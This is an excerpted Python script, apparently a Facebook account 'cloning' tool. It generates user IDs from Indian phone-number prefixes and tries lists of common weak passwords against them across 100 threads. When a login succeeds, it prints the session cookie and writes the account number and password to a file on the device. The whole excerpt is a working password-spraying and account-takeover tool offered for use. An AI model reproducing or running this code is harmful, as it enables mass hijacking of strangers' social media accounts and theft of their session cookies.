...
from os import system as _ongkon_
from os import remove as __ongkon__
...
def snigdho():
    ...
    #os.system('xdg-open https://youtube.com/@snigdhoafridi')
    snigdho_Hasan(logo)
    print ('\x1b[1;94m[1]  Clone From RANDOM BD    \033[1;36m[V1]')
    print ('\x1b[1;92m[2]  Clone From GMAIL        \033[1;32m[V1]')
    print ('\x1b[1;95m[3]  Clone From RANDOM PK    \033[1;36m[V1]')
    print ('\x1b[1;96m[3]  Indian Number Cloning  \033[1;36m[V1]')
    print ('\x1b[1;93m[5]  Contact Me')
...
def snigdho_india():
    ...
    os.system("clear")
    snigdho_Hasan(logo)
    snigdho_Hasan(f'INDIAN SIM CODE (941414,974532,983267,902438,892729')
    snigdho_Hasan(" ----------------------------------------------------------------------------------------------------")
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        snigdho_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','india']
            uid = code+love
            for snigdho in HamiiID:
                pwx.append(snigdho)
                pwx.append(love)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[LIMON-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/LIMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[LIMOM-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                sn4gdh9('/sdcard/LIMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}BRAND{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
